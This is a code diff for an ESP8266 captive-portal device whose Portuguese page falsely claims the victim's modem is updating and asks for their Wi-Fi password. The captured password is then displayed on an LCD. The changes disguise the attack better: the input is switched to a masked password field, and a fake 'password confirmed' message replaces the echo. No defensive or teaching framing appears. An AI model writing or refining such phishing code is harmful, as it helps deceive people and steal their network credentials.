@@ -11,7 +11,7 @@ IPAddress         apIP(10, 10, 10, 1);    // Private network for server
 DNSServer         dnsServer;              // Create the DNS object
 ESP8266WebServer  server(80);          // HTTP server
 
-String responseHTML = "<!DOCTYPE html><html><head><title>CaptivePortal</title><meta charset='utf-8'></head><body><h1>Atualização em andamento.</h1><p>Seu modem está sendo atualizado, para finalizar a atualização, confirme a senha de seu Wifi:</p><form action='/submit' method='GET'><input id='pass' name='pass' type='text'/></br><button type='submit'>Enviar</button></form></body></html>";
+String responseHTML = "<!DOCTYPE html><html><head><title>CaptivePortal</title><meta charset='utf-8'></head><body><h1>Atualização em andamento.</h1><p>Seu modem está sendo atualizado, para finalizar a atualização, confirme a senha de seu Wifi:</p><form action='/submit' method='GET'><input id='pass' name='pass' type='password'/></br><button type='submit'>Enviar</button></form></body></html>";
 
 
 void setup() {
@@ -49,7 +49,7 @@ void handleSubmit(){
   lcd.print("Senha recebida:");
   lcd.setCursor(0, 1);
   lcd.print(server.arg("pass"));
-  server.send(200, "text/html", server.arg("pass"));
+  server.send(200, "text/html", "<!DOCTYPE html><html><head><title>CaptivePortal</title><meta charset='utf-8'></head><body><h1>Senha confirmada, aguarde o reestabelecimento de sua conexão.</h1></body></html>");
   }
 
 void clearLine(int linha, int colunas){
